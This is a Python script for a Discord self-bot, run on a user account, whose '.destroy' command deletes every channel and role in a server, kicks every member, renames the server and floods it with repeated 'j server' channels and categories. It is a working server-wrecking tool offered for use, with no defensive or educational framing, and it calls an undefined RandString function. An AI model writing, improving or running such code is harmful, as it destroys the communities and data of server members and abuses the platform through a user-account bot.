import discord
from discord.ext import commands
import os
import re
import json


print ("Loading..")

bot = commands.Bot(command_prefix='.', self_bot=True)
bot.remove_command("help")

@bot.event
async def on_ready():
  print(f"Bot is online!") 

@bot.command()
async def destroy(ctx):
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
        try:
           await  channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
        )  
    except:
        pass                 
    for _i in range(10):
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")
        await ctx.guild.create_text_channel(name="j server")
        await ctx.guild.create_voice_channel(name="j server")
        await ctx.guild.create_category(name=" j server")


        
bot.run('', bot=False)
